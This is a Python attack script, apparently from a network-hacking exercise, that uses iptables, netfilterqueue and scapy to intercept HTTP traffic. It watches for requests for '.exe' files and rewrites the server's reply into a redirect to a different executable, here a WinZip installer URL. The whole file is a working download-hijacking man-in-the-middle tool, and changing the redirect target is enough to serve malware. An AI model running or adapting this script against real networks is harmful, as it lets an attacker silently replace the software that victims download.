import scapy.all as scapy
import netfilterqueue
import os
ack_lst = []
 
 
def replace_download(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] HTTP Request", scapy_packet[scapy.TCP].ack)
            if b".exe" in scapy_packet[scapy.Raw].load:
                ack_lst.append(scapy_packet[scapy.TCP].ack)
 
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] HTTP Response", ack_lst)
            if scapy_packet[scapy.TCP].seq in ack_lst:
                print("[+] Replacing File")
                # print(scapy_packet.show())
                ack_lst.remove(scapy_packet[scapy.TCP].seq)
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://download.winzip.com/gl/nkln/winzip24-home.exe\n\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))
    packet.accept()
 
 
try:
    os.system('iptables -I OUTPUT -j NFQUEUE --queue-num {}'.format('1'))   
    os.system('iptables -I INPUT -j NFQUEUE --queue-num {}'.format('1')) 
    os.system('iptables -I FORWARD -j NFQUEUE --queue-num {}'.format('1'))
    nfqueue = netfilterqueue.NetfilterQueue()
    nfqueue.bind(1, replace_download)
    nfqueue.run()
except KeyboardInterrupt:
    print("\n \n [+] Detected ctrl+c ... Quitting ...!!!")
    
'''

'''
